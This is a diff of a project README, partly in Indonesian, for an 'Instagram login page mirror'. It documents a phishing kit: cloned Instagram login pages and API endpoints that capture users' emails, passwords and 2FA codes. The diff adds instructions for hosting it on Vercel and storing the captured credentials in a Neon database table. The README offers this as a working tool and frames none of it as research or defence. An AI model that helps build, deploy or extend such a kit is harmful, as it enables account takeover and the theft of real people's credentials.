@@ -1,33 +1,48 @@
 # Instagram Login Page Mirror
 
-Static mirror of Instagram's web login page. No build tools, no package managers, no tests, no CI.
+Instagram login page mirror with 2FA. Dark/light theme otomatis.
 
-## Run
+## Local dev
 
 ```
 node server.js
 ```
 
-Open `http://localhost:3000`.
+Buka `http://localhost:3000`. Data login & 2FA tersimpan ke `_saved_logins/*.txt`.
 
-## How it works
+## Vercel + Neon deploy
 
-- `server.js` — Node HTTP server on port 3000. Routes `/` based on User-Agent: desktop → `index.html`, mobile → `indexm.html`. `indexmobile.html` is not served by the server (fetch it directly).
-- `POST /api/save-login` — saves email/password to `_saved_logins/<sanitized-email>.txt`.
-- Static files served from repo root with MIME types for `.html`, `.js`, `.css`, `.json`, `.png`, `.webp`, `.ico`.
+- Deploy repo ke Vercel (hubungkan GitHub repo)
+- Buat database [Neon](https://neon.tech) (free tier cukup)
+- Set env `DATABASE_URL` di dashboard Vercel
+- API functions di `api/` folder otomatis jalan sebagai serverless functions
+- Data masuk ke tabel `logins` di Neon
+
+## API
+
+| Endpoint | Method | Body | Fungsi |
+|---|---|---|---|
+| `/api/save-login` | POST | `{ email, password }` | Simpan login |
+| `/api/save-code` | POST | `{ email, code }` | Simpan kode 2FA |
+
+## Routing
+
+- `server.js` — lokal, route `/` based on User-Agent: desktop → `index.html`, mobile → `indexm.html`
+- `indexmobile.html` tidak diserve oleh server lokal (buka langsung)
+- Vercel — static files dari root, API dari `api/` folder
 
 ## Files
 
-- `index.html` — desktop login page (mirrors Instagram's full desktop login)
-- `indexm.html` — mobile login page (custom dark/light theme, served on mobile devices)
-- `indexmobile.html` — mobile login page (mirrors Instagram's touch login, not served by default)
-- `mainfest.json` — desktop PWA manifest
+- `index.html` — desktop login (mirror Instagram full desktop)
+- `indexm.html` — mobile login (custom, dark/light theme, 2FA enabled)
+- `indexmobile.html` — mobile login (mirror Instagram touch login, not served by default)
+- `mainfest.json` — desktop PWA manifest (intentional typo "mainfest")
 - `mainfastmobile.json` — mobile PWA manifest
-- `image.png`, `meta.png` — assets used by `indexm.html`
+- `image.png`, `logolight.png` — Instagram logo (dark/light)
+- `meta.png`, `metalight.png`, `metadark.png` — Meta logo (dark/light)
 
 ## Key details
 
-- `_saved_logins/` dir is created automatically on first login save. Do not commit this directory.
-- No env vars needed. No dependencies beyond Node.js built-ins.
-- Binding to `0.0.0.0` allows LAN access.
-- `mainfest.json` has the intentional typo "mainfest" (not "manifest") — the HTML references `"/data/manifest.json"`, so the server resolves it to `./data/manifest.json` which likely 404s in this repo.
+- `_saved_logins/` — local dev only, jangan di-commit
+- `DATABASE_URL` env var — required for Vercel/Neon
+- `node_modules/` dikomit? Boleh, Vercel butuh untuk install `pg`. Atau pakai `vercel.json` build config.
